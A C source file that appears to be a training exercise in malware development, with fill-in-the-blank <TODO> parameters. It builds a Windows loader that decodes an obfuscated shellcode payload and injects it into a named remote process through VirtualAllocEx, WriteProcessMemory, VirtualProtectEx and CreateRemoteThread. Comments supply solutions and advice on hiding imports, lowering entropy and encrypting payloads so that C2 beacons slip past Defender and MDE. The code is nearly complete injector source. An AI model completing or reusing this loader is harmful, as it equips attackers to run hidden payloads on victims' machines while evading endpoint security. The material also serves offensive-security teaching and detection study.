/*
 * Oh no, I didn't finish the code, try to replace the <TODO> with the right parameter.
 */

#include <windows.h>
#include <TlHelp32.h>
#include "sc.h"
#include "nt.h"

#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)

// The encoding table used by the base64
static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/' };
static char* decoding_table = NULL;

// Build the decoding table that will be used by the base64_decode function
void build_decoding_table() {

    decoding_table = (char*)malloc(256);
    if (decoding_table == NULL) {
        DEBUG("[x] Cannot allocate memory for the decoding table\n");
        exit(-1);
    }
    for (int i = 0; i < 64; i++) {
        decoding_table[(unsigned char)encoding_table[i]] = i;
    }
}

/****************************************************************/
/* This function is used to debase64 a string                   */
/* base64_decode(sc, sc_length, &szOutput);                     */
/****************************************************************/
unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {

    if (decoding_table == NULL) build_decoding_table();

    if (input_length % 4 != 0) return NULL;

    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') {
        (*output_length)--;
    }
    if (data[input_length - 2] == '=') (*output_length)--;

    unsigned char* decoded_data = (unsigned char*)malloc(*output_length);
    if (decoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        DWORD sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        DWORD sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        DWORD sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        DWORD sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

        DWORD triple = (sextet_a << 3 * 6)
            + (sextet_b << 2 * 6)
            + (sextet_c << 1 * 6)
            + (sextet_d << 0 * 6);

        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }

    return decoded_data;
}

/************************************************************/
/* This function takes the name of a process and store its  */
/* PID in the PID parameter and return the process HANDLE   */
/* The PID is NULL if the function failed                   */
/*                                                          */
/* HANDLE proc = getProcHandlebyName("notepad.exe", &pid);  */
/************************************************************/
HANDLE getProcHandlebyName(LPSTR procName, DWORD* PID) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	NTSTATUS status = NULL;
	HANDLE hProc = 0;

    // Get a list of all currently running process
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!snapshot) {
		DEBUG("[x] Cannot retrieve the processes snapshot\n");
		return NULL;
	}
	if (Process32First(snapshot, &entry)) {
		do {
            // Parse each process information
			if (strcmp((entry.szExeFile), procName) == 0) {
                // Retrieve the PID of the right process
				*PID = entry.th32ProcessID;
				DEBUG("[+] Injecting into : %d\n", *PID);
                // Open an handle on this process
				HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
				if (!hProc) {continue;}
				return hProc;
			}
		} while (Process32Next(snapshot, &entry));
	}

    // Return NULL if no process have been found or opened
	return NULL;
}


/****************************************************************/
/* This function is used to unhide a base64 string that was     */
/* generated using the encryptor_entropy.py generator           */
/* base64_unhide(sc, size, &sc_unhide, &sc_unhide_length);      */
/****************************************************************/
void base64_unhide(char *sc, int sc_length, char** sc_unhide, int* sc_unhide_length) {
	char* token;
	*sc_unhide_length = 0;
	token = strtok(sc, " ");
	*sc_unhide = calloc(sc_length, sizeof(char));
	while (token != NULL) {
		(*sc_unhide)[*sc_unhide_length] = token[0];
		*sc_unhide_length += 1;
		token = strtok(NULL, " ");
	}
	(*sc_unhide)[*sc_unhide_length] = '\0';
	char* tmp = *sc_unhide;
	*sc_unhide = realloc(tmp, *sc_unhide_length);
}

/****************************************************************/
/* This function is used to xor a string with a key             */
/* unxor(shellcode, shellcodeSize, key, keySize)                */
/****************************************************************/
void unxor(unsigned char* sc, size_t scSize, unsigned char* key, size_t keySize){
    for(int i = 0; i < scSize; i++){
        sc[i] ^= key[i%keySize];
    }
}



int main(void) {
    /************************************************************/
    /* The goal is to implement a simple shellcode injection in */
    /* a remote process.                                        */
    /* You can use all the snippet in the snipper directory     */
    /************************************************************/

    // Last step : Dynamic API resolution (this is an optional step that must be tackled down at the end
    //             just comment this section until you are ready to do it)
    // Hands on : Explore the PE import table
    // Solution : On PEBear, go to the import table, you will see all the imports performed by the binary
    //            All the functions used by the binary are listed here. You should see the different Win32
    //            functions. EDR can use these information to statically see if the binary is likely to be
    //            a malware. Thus, it is always a good idea to dynamically fetch these functions using 
    //            GetProcAddress.
    //            If you are using VisualStudio, you can use the dumpbin.exe binary with the /imports args.
    //            It will list the whole binary import table.
    // Hands on : Remove the WINAPI imports from the import table
    // Tips : Use the GetModuleHandleA and GetProcAddress functions
    //        All function definitions are given in the code snippets
    // Solution : The GetModuleHandleA is used to get a handle on the DLL that store the wanted function.
    //            If the DLL is not loaded, it is possible to force it using LoadLibraryA instead.
    //            The GetProcAddress is used to resolve the function address on the DLL and get a pointer
    //            to the function that can be used as is in the code.
    //            This method is the most important one and the most used in malware development. You must
    //            understand it. Feel free to ask for additional information about it !

    // Get the DLL handle that will be used to resolve the other functions
    HANDLE k32 = GetModuleHandleA("<TODO>");
    if(!k32){
        DEBUG("[x] Cannot load KERNEL32.DLL\n");
        return -1;
    }

    // For each functions, use GetProcAddress to retrieve their address
    // in the KERNEL32.DLL module
    openProcess = GetProcAddress(k32, "<TODO>");
    virtualProtectEx = GetProcAddress(k32, "<TODO>");
    writeProcessMemory = GetProcAddress(k32, "<TODO>");
    virtualAllocEx = GetProcAddress(k32, "<TODO>");
    createRemoteThread = GetProcAddress(k32, "<TODO>");
    
    if(!openProcess || !virtualProtectEx || !writeProcessMemory || !virtualAllocEx || !createRemoteThread){
        DEBUG("[x] Cannot load all required functions\n");
        return -1;
    }
    // You can change all references to these functions in the following code
    // The dumpbin /import should be quite empty now.






    // First step : Retrieve the payload stored in the .data
    buildsc();
    // Hands on : Store the payload in the .data section
    // Hands on : Once compiled, analyse the PE with PEbear and the Sysinternal String. Do you see your
    //            payload ? Can you see it in the .data section ?
    // Hands on : You can try to split it in the .data and .rdata section
    // Tips : When variable are marked as const in the C code, it will be stored in the .rdata section
    
    size_t szOutput;
    unsigned char* scBytes = base64_decode(<TODO>, <TODO>, &szOutput);
	if (szOutput == 0) {
		DEBUG("[x] Base64 decode failed \n");
		return -1;
	}
    int scLength = szOutput;

    // Hands on : Encrypt with a simple XOR encryption
    //size_t szOutput;
	//unsigned char* scBytes = base64_decode(<TODO>, <TODO>, &szOutput);
    //if (szOutput == 0) {
	//	DEBUG("[x] Base64 decode failed \n");
	//	return -1;
	//}
    //unxor(<TODO>, szOutput, <TODO>, 32);
    //int scLength = szOutput;

    // Hands on : Implement some entropy evasion
    //size_t szOutput;
    //char* sc_unhide;
	//int sc_unhide_length;
	//base64_unhide(<TODO>, <TODO>, &sc_unhide, &sc_unhide_length);
	//unsigned char* scBytes = base64_decode(<TODO>, <TODO>, &szOutput);
    //if (szOutput == 0) {
	//	DEBUG("[x] Base64 decode failed \n");
	//	return -1;
	//}
    //unxor(<TODO>, szOutput, <TODO>, 32);
    //int scLength = szOutput;


    // Hands on : Does it change the binary entropy ? Why ? How is it possible to fix this ?
    // Solution : Not really. The problem is that even if the entropy is lowered, the technique used to
    //            reconstruct the payload add ASM instruction in the final payload that remove all the 
    //            benefits of the technique.
    //            It is possible to fix it by simply adding text in the section without reconstructing it.






    // Second step : Open an handle on the remote process
    DWORD PID = 0;
    HANDLE procHandle = getProcHandlebyName("<TODO>", &PID);
    if(!procHandle){
        DEBUG("[x] Failed to open the process\n");
        return -1;
    }






    // Third step : Allocate memory on the remote process
    // Hands on : Check with process hacker what happend in the process memory. 
    //            Change the initial permissions.
    // Tips : Use the VirtualAllocEx function with PAGE_READWRITE permission
    // Solution : A new memory page has been created and can be seen in the "memory" tab of ProcessHacker.
    //            The memory page is scLength long with RW protection.
    //            You can change the page protection here to RWX to better see the modification
    PVOID remoteBuffer = VirtualAllocEx(<TODO>, NULL, (SIZE_T)<TODO>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(!remoteBuffer){
        DEBUG("[x] Failed to allocate process memory: %d\n", GetLastError());
        return -1;
    }






    // Fourth step : Write the payload in memory
    // Hands on : Check with process hacker if the payload has been successfully written
    // Tips : Use the WriteProcessMemory
    int status = WriteProcessMemory(<TODO>, <TODO>, <TODO>, scLength, &szOutput);
    if(!status){
        DEBUG("[x] Failed to write process memory... : %d\n", GetLastError());
        return -1;
    }






    // Fifth step : Reprotect the memory
    // Tips : Use the VirtualProtectEx with PAGE_EXECUTE_READ permission
    DWORD oldProtect;
    status = VirtualProtectEx(<TODO>, <TODO>, scLength, <TODO>, &oldProtect);
    if(!status){
        DEBUG("[x] Failed to reprotect the memory\n");
        return -1;
    }






    // Sixth step : Run the payload in a new thread
    //              Put a breakpoint in the injected process
    //              and look at its threadstack
    // Tips : Use CreateRemoteThread :
    //        CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    // Solution : The threadstack can be seen using ProcessHacker. You should see a new thread created starting
    //            on RtlUserThread and executing unknown instruction (you will see your payload address)
    HANDLE threadHandle = CreateRemoteThread(<TODO>, NULL, 0, (LPTHREAD_START_ROUTINE)<TODO>, NULL, 0, NULL);
    if(!threadHandle){
        DEBUG("[x] Failed to create the thread\n");
        return -1;
    }
	
    return 0;


    /****************************************************************/
    /*                          MDE                                 */
    /****************************************************************/

    // It is expected that MDE will detect the loader.
    // When the payload is only stored with base64, Windows Defender can flag it as the Covenant beacon
    // is signatured. However, depending on the compilation method, Defender can fail to flag it.
    // An interesting experience is with the Havoc beacon that is instantly flagged by Defender when
    // stored in base64 in the .data section.
    // That's why it is always preferable to encrypt the payload using basic encryption algorithm with
    // random key (XOR, AES, RC4).

    // During the execution, you should see in MDE the following IOC:
    // - Anomalous memory allocation
    // - Anomalous memory protection
    // - Process X create a thread on Process Y : Process injection attempt

    // The memory allocation alert is raised due to the use of VirtualAlloc on an important memory block in
    // a remote process. An first idea to limit this detection is to limit the size of the payload injected.
    // However, when using C2, the payload size is hardly modifiable. So we have to find another method.

    // The memory protection alert is raised due to the use of VirtualProtect on a remote process.
    // The first idea to remove this detection is to create the section with RWX rights so it is not needed
    // to change the protection after. However, RWX section are the worst IOC possible that will trigger 
    // all EDR. So, that's an IOC we will live with for now.

    // The last alert is raised due to the use of CreateRemoteThread. 
    // This IOC might be the worst one as it is the one used by MDE to ensure that a process injection is
    // attempted. However, this API is needed to redirect the execution flow to the malicious payload.
    // We will see in the next parts how we can get rid of this nasty API.
}